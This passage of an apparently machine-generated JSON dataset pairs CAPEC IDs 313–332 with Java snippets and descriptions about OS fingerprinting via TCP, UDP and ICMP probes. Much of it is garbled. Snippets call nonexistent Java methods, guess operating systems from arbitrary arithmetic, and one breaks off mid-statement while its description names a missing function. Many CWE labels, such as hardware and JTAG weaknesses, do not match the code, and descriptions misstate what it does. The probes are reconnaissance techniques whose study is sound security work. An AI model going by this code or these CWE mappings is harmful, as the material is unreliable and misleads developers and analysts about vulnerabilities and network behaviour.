        "description": "This Java code snippet demonstrates OS fingerprinting by sending a malformed HTTP request to a target host and analyzing the response to detect the operating system. The code sends a GET request with an incomplete HTTP header, which causes the target server to respond with an error message that reveals information about the operating system. The code then parses the response to extract the Server header, which is used to identify the operating system. This code embodies CWE-200, CWE-497, CWE-207, CWE-319, and CWE-1323 by transmitting sensitive information in cleartext, exposing sensitive system information, and behaving differently than other products with equivalent functionality."
    },
    {
        "capec_id": "313",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class PassiveOSDetector {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket(8888);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        String data = new String(packet.getData(), 0, packet.getLength());\n        System.out.println(\\",
        "description": "This Java code snippet demonstrates a passive OS detector that receives network packets and analyzes them to identify the operating system. The analyzePacket function is vulnerable to multiple CWEs, including exposure of sensitive information, improper management of sensitive trace data, cleartext transmission of sensitive information, and inconsistent view of the underlying operating system. In a real-world scenario, this function would be replaced with a more sophisticated OS detection algorithm that properly handles sensitive system information and avoids these vulnerabilities."
    },
    {
        "capec_id": "314",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class ActiveOSFingerprinting {\n    private static final Logger LOGGER = Logger.getLogger(ActiveOSFingerprinting.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(\"example.com\");\n            String osFingerprint = getOSFingerprint(inetAddress);\n            LOGGER.info(\"OS Fingerprint: \" + osFingerprint);\n\n            // CWE-592: Authentication Bypass Issues\n            // CWE-247: Reliance on DNS Lookups in a Security Decision\n            // CWE-534: Information Exposure Through Debug Log Files\n            FileHandler fileHandler = new FileHandler(\"debug.log\", true);\n            LOGGER.addHandler(fileHandler);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fileHandler.setFormatter(formatter);\n            LOGGER.info(\"Debug Log: \" + osFingerprint);\n\n            // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n            // CWE-1323: Improper Management of Sensitive Trace Data\n            String traceData = getTraceData(inetAddress);\n            LOGGER.info(\"Trace Data: \" + traceData);\n        } catch (UnknownHostException e) {\n            LOGGER.severe(\"Unknown Host Exception: \" + e.getMessage());\n        }\n    }\n\n    private static String getOSFingerprint(InetAddress inetAddress) {\n        // Simulate OS fingerprinting logic\n        return \"OS Fingerprint: \" + inetAddress.getHostAddress();\n    }\n\n    private static String getTraceData(InetAddress inetAddress) {\n        // Simulate trace data collection logic\n        return \"Trace Data: \" + inetAddress.getHostAddress();\n    }\n}",
        "description": "This Java code snippet demonstrates active OS fingerprinting by resolving a hostname to an IP address and logging the OS fingerprint and trace data. It also includes deprecated CWEs for context, such as authentication bypass issues, reliance on DNS lookups, information exposure through debug log files, fabric-address map overlaps, and improper management of sensitive trace data."
    },
    {
        "capec_id": "315",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.logging.Logger;\n\npublic class ActiveOSFingerprinting {\n    private static final Logger LOGGER = Logger.getLogger(ActiveOSFingerprinting.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"example.com\");\n            LOGGER.info(\"OS Fingerprinting: \" + address);\n            // CWE-294: Authentication Bypass by Capture-replay\n            // Sniff network traffic and replay it to bypass authentication\n            String sniffedTraffic = \"sniffed authentication packet\";\n            LOGGER.info(\"Replaying sniffed traffic: \" + sniffedTraffic);\n            // CWE-589: Call to Non-ubiquitous API\n            // Using an API function that does not exist on all versions of the target platform\n            if (System.getProperty(\"os.name\").equals(\"Windows\")) {\n                // Windows-specific API call\n                LOGGER.info(\"Windows-specific API call\");\n            } else {\n                // Non-Windows API call\n                LOGGER.info(\"Non-Windows API call\");\n            }\n        } catch (UnknownHostException e) {\n            LOGGER.severe(\"Unknown host exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates active OS fingerprinting by resolving a hostname to an IP address and logging the result. It also includes examples of CWE-294 (Authentication Bypass by Capture-replay) and CWE-589 (Call to Non-ubiquitous API) for additional context."
    },
    {
        "capec_id": "316",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class ActiveOSFingerprinting {\n    public static void main(String[] args) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(\"example.com\");\n            System.out.println(\"OS Fingerprinting: \" + inetAddress);\n            // CWE-592: Authentication Bypass Issues\n            // CWE-534: Information Exposure Through Debug Log Files\n            // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n            // CWE-1324: Sensitive Information Accessible by Physical Probing of JTAG Interface\n            // CWE-247: Reliance on DNS Lookups in a Security Decision\n            String os = getOSFromDNSLookup(inetAddress);\n            System.out.println(\"Detected OS: \" + os);\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception\");\n        }\n    }\n\n    private static String getOSFromDNSLookup(InetAddress inetAddress) {\n        // Simulating OS detection from DNS lookup\n        // This is a vulnerable implementation, do not use in production\n        return \"Windows\";\n    }\n}",
        "description": "This Java code snippet demonstrates active OS fingerprinting, which is a deprecated CAPEC pattern. It uses DNS lookups to detect the operating system of a remote host, which can be vulnerable to authentication bypass issues, information exposure, and other security weaknesses. The code includes deprecated CWEs for additional context."
    },
    {
        "capec_id": "317",
        "code_snippet": "import java.net.*;\nimport java.util.*;\n\npublic class OSFingerprintingProbe {\n    public static void main(String[] args) throws Exception {\n        InetAddress target = InetAddress.getByName(\"target_host\");\n        DatagramSocket socket = new DatagramSocket();\n        socket.connect(target, 80);\n\n        // CWE-200: Exposure of Sensitive Information\n        System.out.println(\"Target OS: \" + getOSFromIDSequence(socket));\n\n        // CWE-291: Reliance on IP Address for Authentication\n        if (target.getHostAddress().equals(\"authorized_ip\")) {\n            System.out.println(\"Authorized access granted\");\n        } else {\n            System.out.println(\"Access denied\");\n        }\n    }\n\n    public static String getOSFromIDSequence(DatagramSocket socket) throws Exception {\n        byte[] data = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(data, data.length);\n        socket.receive(packet);\n        int id = ByteBuffer.wrap(packet.getData()).getInt(2);\n\n        // CWE-1192: Improper Identifier for IP Block\n        String os = getOSFromID(id);\n        return os;\n    }\n\n    public static String getOSFromID(int id) {\n        // CWE-1294: Insecure Security Identifier Mechanism\n        if (id % 2 == 0) return \"Windows\";\n        else if (id % 3 == 0) return \"Linux\";\n        else return \"Unknown\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that analyzes the IP 'ID' field sequence number generation algorithm of a remote host to identify the operating system. It uses CWE-200 to expose sensitive information, CWE-291 for IP address-based authentication, CWE-1192 for improper identifier usage, and CWE-1294 for an insecure security identifier mechanism."
    },
    {
        "capec_id": "318",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class OSFingerprintingProbe {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        InetAddress address = InetAddress.getByName(\"target_host\");\n        socket.send(packet);\n        socket.receive(packet);\n        byte[] receivedData = packet.getData();\n        int id = (receivedData[4] & 0xFF) << 8 | receivedData[5] & 0xFF;\n        System.out.println(\"Received ID: \" + id);\n        // CWE-200: Exposure of Sensitive Information\n        System.out.println(\"OS Fingerprint: \" + getOSFingerprint(id));\n    }\n\n    private static String getOSFingerprint(int id) {\n        // CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\n        // CWE-1290: Incorrect Decoding of Security Identifiers\n        // CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n        // CWE-1323: Improper Management of Sensitive Trace Data\n        if (id % 2 == 0) {\n            return \"Linux\";\n        } else {\n            return \"Windows\";\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on the remote host and observes the manner in which this bit is echoed back in the ICMP error message. The identification field (ID) is typically utilized for reassembling a fragmented packet. The code exposes sensitive information to an unauthorized actor (CWE-200) and uses improper identifiers for IP blocks in System-on-Chip (SOC) components (CWE-1192). It also incorrectly decodes security identifiers (CWE-1290), lacks source identifiers in entity transactions on a System-on-Chip (SOC) (CWE-1302), and improperly manages sensitive trace data (CWE-1323)."
    },
    {
        "capec_id": "319",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class OSFingerprintingProbe {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"remote_host_ip\");\n        byte[] data = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, 8080);\n        socket.send(packet);\n        socket.setSoDonotFragment(true);\n        DatagramPacket response = new DatagramPacket(new byte[1024], 1024);\n        socket.receive(response);\n        byte[] responseBytes = response.getData();\n        boolean dfBitSet = (responseBytes[0] & 0x4000) != 0;\n        System.out.println(\"DF bit is \" + (dfBitSet ? \"set\" : \"not set\"));\n    }\n}\n",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that tests whether a remote host echoes back the IP 'DF' (Don't Fragment) bit in a response packet. The code sends a UDP datagram with the DF bit set to a closed port on the remote host and checks if the 'DF' bit is set in the response packet. This can be used to identify the operating system of the remote host, potentially exposing sensitive information to an unauthorized actor (CWE-200). The code also incorrectly specifies the destination in the communication channel (CWE-941) and does not properly manage sensitive trace data (CWE-1323). Additionally, the code does not prevent the activation of test or debug logic at runtime (CWE-1313) and does not ensure correct connection of hardware child blocks to the parent system (CWE-1276)."
    },
    {
        "capec_id": "320",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.IOException;\nimport java.net.UnknownHostException;\n\npublic class TCPFingerprinting {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket();\n        socket.connect(new InetSocketAddress(\"target_host\", 80));\n        byte[] tcpHeader = getTCPHeader(socket);\n        int timestampOption = getTimestampOption(tcpHeader);\n        if (timestampOption != -1) {\n            long timestamp = getTimestamp(tcpHeader, timestampOption);\n            System.out.println(\"TCP Timestamp: \" + timestamp);\n            // Analyze the timestamp to guess the operating system\n            String os = analyzeTimestamp(timestamp);\n            System.out.println(\"Operating System: \" + os);\n        }\n    }\n\n    private static byte[] getTCPHeader(Socket socket) throws IOException {\n        // Get the TCP header from the socket\n        // This may involve sniffing network traffic or capturing packets\n        // For demonstration purposes, assume we have a method to get the TCP header\n        return new byte[0];\n    }\n\n    private static int getTimestampOption(byte[] tcpHeader) {\n        // Find the TCP timestamp option in the TCP header\n        // This may involve parsing the TCP header and searching for the timestamp option\n        // For demonstration purposes, assume we have a method to get the timestamp option\n        return -1;\n    }\n\n    private static long getTimestamp(byte[] tcpHeader, int timestampOption) {\n        // Extract the timestamp from the TCP header\n        // This may involve parsing the TCP header and extracting the timestamp value\n        // For demonstration purposes, assume we have a method to get the timestamp\n        return 0;\n    }\n\n    private static String analyzeTimestamp(long timestamp) {\n        // Analyze the timestamp to guess the operating system\n        // This may involve comparing the timestamp to known values or patterns\n        // For demonstration purposes, assume we have a method to analyze the timestamp\n        return \"Unknown\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates the concept of TCP fingerprinting, which involves analyzing the TCP timestamp option in the TCP header to guess the operating system of a remote server. The code establishes a connection to a target host, captures the TCP header, extracts the timestamp option, and analyzes the timestamp to determine the operating system. This code embodies the CAPEC of OS fingerprinting using TCP timestamps and relates to CWEs 200, 294, 385, 208, and 319, which involve exposure of sensitive information, authentication bypass, covert timing channels, observable timing discrepancies, and cleartext transmission of sensitive information."
    },
    {
        "capec_id": "321",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class TCPSequenceNumberFingerprinting {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"target_host\", 80);\n        OutputStream out = socket.getOutputStream();\n        InputStream in = socket.getInputStream();\n\n        // CWE-200: Exposure of Sensitive Information\n        String osInfo = System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\");\n        out.write(osInfo.getBytes());\n\n        // CWE-605: Multiple Binds to the Same Port\n        ServerSocket serverSocket = new ServerSocket(80);\n        serverSocket.setReuseAddress(true);\n        Socket socket2 = new Socket(\"localhost\", 80);\n\n        // CWE-1283: Mutable Attestation or Measurement Reporting Data\n        byte[] attestationData = new byte[1024];\n        in.read(attestationData);\n        String attestationString = new String(attestationData);\n        System.out.println(\"Attestation Data: \" + attestationString);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveInfo = \"username:password\";\n        out.write(sensitiveInfo.getBytes());\n\n        // CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG)\n        Random random = new Random(System.currentTimeMillis());\n        int sequenceNumber = random.nextInt(1000);\n        out.write(String.valueOf(sequenceNumber).getBytes());\n\n        byte[] receiveBuffer = new byte[1024];\n        in.read(receiveBuffer);\n        String response = new String(receiveBuffer);\n        System.out.println(\"Response: \" + response);\n\n        // Analyze the response to fingerprint the OS\n        String[] parts = response.split(\" \");\n        int acknowledgementNumber = Integer.parseInt(parts[0]);\n        int sequenceNumberReceived = Integer.parseInt(parts[1]);\n        if (sequenceNumberReceived == 0) {\n            System.out.println(\"OS: Windows\");\n        } else if (sequenceNumberReceived == acknowledgementNumber) {\n            System.out.println(\"OS: Linux\");\n        } else if (sequenceNumberReceived == acknowledgementNumber + 1) {\n            System.out.println(\"OS: macOS\");\n        } else {\n            System.out.println(\"OS: Unknown\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of TCP sequence number fingerprinting to identify the target operating system. It incorporates related CWEs, including exposure of sensitive information, multiple binds to the same port, mutable attestation or measurement reporting data, cleartext transmission of sensitive information, and predictable seed in PRNG. The code sends a probe packet to an open port, analyzes the response, and fingerprints the OS based on the sequence number and acknowledgement number relationship."
    },
    {
        "capec_id": "322",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class OSFingerprinter {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket();\n        socket.connect(new InetSocketAddress(\"target_host\", 80));\n        List<Integer> sequenceNumbers = new ArrayList<>();\n        for (int i = 0; i < 10; i++) {\n            socket.send(new byte[] { (byte) 0x01, (byte) 0x02, (byte) 0x03, (byte) 0x04 }); // Send SYN packet\n            byte[] response = new byte[1024];\n            socket.receive(response);\n            int sequenceNumber = ((response[4] & 0xFF) << 24) | ((response[5] & 0xFF) << 16) | ((response[6] & 0xFF) << 8) | (response[7] & 0xFF);\n            sequenceNumbers.add(sequenceNumber);\n        }\n        int increment = findSmallestIncrement(sequenceNumbers);\n        System.out.println(\"OS Type/Version: \" + getOSType(increment));\n    }\n\n    private static int findSmallestIncrement(List<Integer> sequenceNumbers) {\n        int minIncrement = Integer.MAX_VALUE;\n        for (int i = 1; i < sequenceNumbers.size(); i++) {\n            int increment = sequenceNumbers.get(i) - sequenceNumbers.get(i - 1);\n            if (increment < minIncrement) {\n                minIncrement = increment;\n            }\n        }\n        return minIncrement;\n    }\n\n    private static String getOSType(int increment) {\n        // Compare increment with a database of OS behaviors\n        if (increment == 128) {\n            return \"Windows\";\n        } else if (increment == 256) {\n            return \"Linux\";\n        } else {\n            return \"Unknown\";\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that sends multiple TCP SYN packets to an open port of a remote machine, analyzes the Initial Sequence Number (ISN) in each response packet, and determines the smallest increment value used by the target host. The increment value is then compared against a database of OS behaviors to identify the OS type and/or version. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-1323 (Improper Management of Sensitive Trace Data), CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), and CWE-1283 (Mutable Attestation or Measurement Reporting Data) by transmitting sensitive information in cleartext and exposing system-level information to unauthorized actors."
    },
    {
        "capec_id": "323",
        "code_snippet": "import java.net.Socket;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class OSDetector {\n    private static AtomicInteger sequenceNumber = new AtomicInteger(0);\n    private static long startTime;\n    private static long endTime;\n    private static int osDetectionThreshold = 1000; // 1 second\n\n    public static void main(String[] args) throws Exception {\n        startTime = System.currentTimeMillis();\n        Socket socket = new Socket(\"targetHost\", 80);\n        for (int i = 0; i < 10000; i++) {\n            socket.getOutputStream().write(i);\n            sequenceNumber.incrementAndGet();\n        }\n        endTime = System.currentTimeMillis();\n        long timeElapsed = endTime - startTime;\n        double sequenceNumberIncrementRate = (double) sequenceNumber.get() / timeElapsed;\n        System.out.println(\"Sequence number increment rate: \" + sequenceNumberIncrementRate);\n        // Compare the sequence number increment rate against a database of OS fingerprints\n        if (sequenceNumberIncrementRate > osDetectionThreshold) {\n            System.out.println(\"Likely OS match: Linux\");\n        } else {\n            System.out.println(\"Likely OS match: Windows\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates an OS detection probe that measures the average rate of initial sequence number increments during a period of time. The sequence number is incremented using a time-based algorithm and is susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely OS matches. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-367 (Time-of-check Time-of-use (TOCTOU) Race Condition), CWE-385 (Covert Timing Channel), CWE-1298 (Hardware Logic Contains Race Conditions), and CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition'))."
    },
    {
        "capec_id": "324",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.util.Random;\n\npublic class SequenceNumberProbe {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"remote_host\", 80);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG)\n        Random random = new Random((int) System.currentTimeMillis());\n        int sequenceNumber = random.nextInt(1000);\n\n        // CWE-341: Predictable from Observable State\n        out.writeInt(sequenceNumber);\n        int response = in.readInt();\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Sequence number response: \" + response);\n\n        // CWE-353: Missing Support for Integrity Check\n        // No integrity check is performed on the received response\n\n        // CWE-211: Externally-Generated Error Message Containing Sensitive Information\n        try {\n            // Simulate an error\n            int divisionByZero = 5 / 0;\n        } catch (ArithmeticException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a sequence number probe attack, which attempts to determine the predictability of a remote host's sequence number generation algorithm. The code uses a predictable seed for the pseudo-random number generator, sends the generated sequence number to the remote host, and prints the response. The code also includes vulnerabilities such as missing integrity checks and exposure of sensitive information."
    },
    {
        "capec_id": "325",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ECNFingerprinting {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"remote_host\", 80);\n            OutputStream outputStream = socket.getOutputStream();\n            InputStream inputStream = socket.getInputStream();\n\n            // Send ECN-enabled packet\n            byte[] packet = new byte[] {(byte) 0x01, (byte) 0x02, (byte) 0x03, (byte) 0x04};\n            outputStream.write(packet);\n\n            // Read response without verifying integrity\n            byte[] response = new byte[1024];\n            int bytesRead = inputStream.read(response);\n            String responseStr = new String(response, 0, bytesRead);\n\n            // Print sensitive information in cleartext\n            System.out.println(\"Response from remote host: \" + responseStr);\n\n            // Insufficient control of network message volume\n            for (int i = 0; i < 100; i++) {\n                outputStream.write(packet);\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an ECN fingerprinting probe that sends an ECN-enabled packet to a remote host and reads the response without verifying its integrity. It then prints the response in cleartext, exposing sensitive information. The code also lacks sufficient control over network message volume, allowing an attacker to cause the program to transmit excessive traffic."
    },
    {
        "capec_id": "326",
        "code_snippet": "import java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class TCPFingerprinting {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"example.com\", 80);\n        InputStream in = socket.getInputStream();\n        OutputStream out = socket.getOutputStream();\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // CWE-121: Stack-based Buffer Overflow\n        byte[] buffer = new byte[1024];\n        in.read(buffer, 0, 1024);\n        String response = new String(buffer);\n        System.out.println(response);\n\n        // CWE-806: Buffer Access Using Size of Source Buffer\n        byte[] srcBuffer = new byte[2048];\n        in.read(srcBuffer, 0, srcBuffer.length);\n        byte[] dstBuffer = new byte[1024];\n        System.arraycopy(srcBuffer, 0, dstBuffer, 0, srcBuffer.length);\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        // CWE-188: Reliance on Data/Memory Layout\n        int initialWindowSize = getInitialWindowSize(response);\n        System.out.println(\"Initial Window Size: \" + initialWindowSize);\n    }\n\n    private static int getInitialWindowSize(String response) {\n        // Parse the response to extract the initial window size\n        // This is a simplified example and may not work in practice\n        return response.indexOf(\"Window\") > 0 ? 1024 : 512;\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of OS fingerprinting by checking the initial TCP Window size. It establishes a TCP connection, reads the response, and extracts the initial window size. The code also includes vulnerabilities related to CWE-200, CWE-121, CWE-806, CWE-1313, and CWE-188, such as exposing sensitive information, using stack-based buffers, accessing memory outside buffer bounds, and relying on data/memory layout."
    },
    {
        "capec_id": "327",
        "code_snippet": "import java.net.*;\nimport java.util.*;\n\npublic class TCPFingerprinting {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"example.com\", 80);\n        SocketAddress sockaddr = new InetSocketAddress(\"example.com\", 80);\n        Socket sock = new Socket();\n        sock.bind(sockaddr);\n        sock.connect(sockaddr);\n        byte[] tcpOptions = getTCPOptions(sock);\n        System.out.println(\"TCP Options: \" + Arrays.toString(tcpOptions));\n        // Analyze the TCP options to fingerprint the OS\n        analyzeTCPOptions(tcpOptions);\n    }\n\n    public static byte[] getTCPOptions(Socket sock) throws Exception {\n        // Get the TCP options from the socket\n        byte[] tcpOptions = new byte[40];\n        sock.setTcpNoDelay(true);\n        sock.setSoTimeout(1000);\n        sock.getOutputStream().write(tcpOptions);\n        return tcpOptions;\n    }\n\n    public static void analyzeTCPOptions(byte[] tcpOptions) {\n        // Analyze the TCP options to determine the OS\n        // This is a simplified example and may not accurately fingerprint the OS\n        if (tcpOptions[0] == 2 && tcpOptions[1] == 4) {\n            System.out.println(\"OS: Windows\");\n        } else if (tcpOptions[0] == 1 && tcpOptions[1] == 3) {\n            System.out.println(\"OS: Linux\");\n        } else {\n            System.out.println(\"OS: Unknown\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a TCP fingerprinting probe that analyzes the type and order of TCP header options present in a response segment to determine the operating system. The code establishes a socket connection to a remote server, retrieves the TCP options, and analyzes them to fingerprint the OS. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the OS information to an unauthorized actor. It is also vulnerable to CWE-188 (Reliance on Data/Memory Layout) as it makes assumptions about the ordering and structure of TCP options, which can vary between operating systems. Additionally, the code is vulnerable to CWE-605 (Multiple Binds to the Same Port) as it allows multiple sockets to bind to the same port, which can lead to service spoofing."
    },
    {
        "capec_id": "328",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.util.zip.CRC32;\nimport java.nio.ByteBuffer;\n\npublic class OSFingerprintingProbe {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"target_host\", 80);\n        OutputStream os = socket.getOutputStream();\n        os.write(\"GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n\".getBytes());\n        os.flush();\n\n        byte[] rstPacket = new byte[1024];\n        InputStream is = socket.getInputStream();\n        int bytesRead = is.read(rstPacket);\n        String rstPacketStr = new String(rstPacket, 0, bytesRead);\n\n        if (rstPacketStr.contains(\"rst\")) {\n            String asciiData = rstPacketStr.substring(rstPacketStr.indexOf(\"rst\") + 4);\n            CRC32 crc = new CRC32();\n            crc.update(asciiData.getBytes());\n            long checksum = crc.getValue();\n            System.out.println(\"OS Fingerprinting Result: \" + asciiData + \" with checksum \" + checksum);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that sends an HTTP request to a target host and captures the RST packet response. It then extracts the ASCII data from the RST packet and calculates a checksum using the CRC32 algorithm. The code does not validate the integrity of the data transmission, does not encrypt the data, and does not authenticate the response, making it vulnerable to CWE-200, CWE-353, CWE-354, CWE-319, and CWE-294."
    },
    {
        "capec_id": "329",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class ICMPErrorGenerator {\n    public static void main(String[] args) {\n        try {\n            InetAddress target = InetAddress.getByName(\"target_ip\");\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, target, 1);\n            socket.send(packet);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable ICMP error generator. It sends a UDP packet to a target IP address on port 1, which is likely to generate an ICMP error message. The error message may contain sensitive information about the target system. The code catches and prints any exceptions that occur during the process, potentially exposing sensitive information."
    },
    {
        "capec_id": "330",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPErrorGenerator {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        String sensitiveInfo = \"username:password\";\n        packet.setData(sensitiveInfo.getBytes());\n\n        // CWE-211: Externally-Generated Error Message Containing Sensitive Information\n        socket.send(packet);\n        packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        String errorResponse = new String(packet.getData());\n        System.out.println(\"Error Response: \" + errorResponse);\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        // Replay the packet to bypass authentication\n        socket.send(packet);\n\n        // CWE-353: Missing Support for Integrity Check\n        // No integrity check is performed on the received packet\n\n        // CWE-210: Self-generated Error Message Containing Sensitive Information\n        try {\n            socket.send(new DatagramPacket(\"Error: Invalid Request\".getBytes(), \"localhost\", 1234));\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of generating an ICMP error message and analyzing the integrity of data returned. It includes vulnerabilities related to exposure of sensitive information, externally-generated error messages, authentication bypass by capture-replay, missing support for integrity checks, and self-generated error messages containing sensitive information."
    },
    {
        "capec_id": "331",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class UDPResponder {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        String message = new String(packet.getData(), 0, packet.getLength());\n        InetAddress address = packet.getAddress();\n        int port = packet.getPort();\n        String response = \"Port Unreachable\";\n        DatagramPacket responsePacket = new DatagramPacket(response.getBytes(), response.getBytes().length, address, port);\n        socket.send(responsePacket);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a UDP responder that sends a 'Port Unreachable' error message in response to a UDP packet sent to a closed port. The code does not perform any integrity checks on the received packet, and it sends the response in cleartext, making it vulnerable to CWE-319, CWE-353, and CWE-924. Additionally, it does not handle length parameter inconsistencies, making it vulnerable to CWE-130. The response message can be used to build a signature-based operating system response, as described in the CAPEC."
    },
    {
        "capec_id": "332",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class OSFingerprinting {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        InetAddress targetAddress = InetAddress.getByName(\"target_ip\");\n        packet.setAddress(targetAddress);\n        packet.setPort(12345); // closed port\n        socket.send(packet);\n        socket.setSoTimeout(5000);\n        DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n        socket.receive(response);\n        byte[] icmpResponse = response.getData();\n        String icmpResponseString = new String(icmpResponse);\n        System.out.println(\"ICMP Response: \" + icmpResponseString);\n        // Analyze the ICMP response to fingerprint the OS\n        String osFingerprint = analyzeICMPResponse(icmpResponseString);\n        System.out.println(\"OS Fingerprint: \" + osFingerprint);\n    }\n\n    private static String analyzeICMPResponse(String icmpResponse) {\n        // TO DO: implement OS fingerprinting logic based on ICMP response\n        return \"Unknown OS\";\n    }\n}",
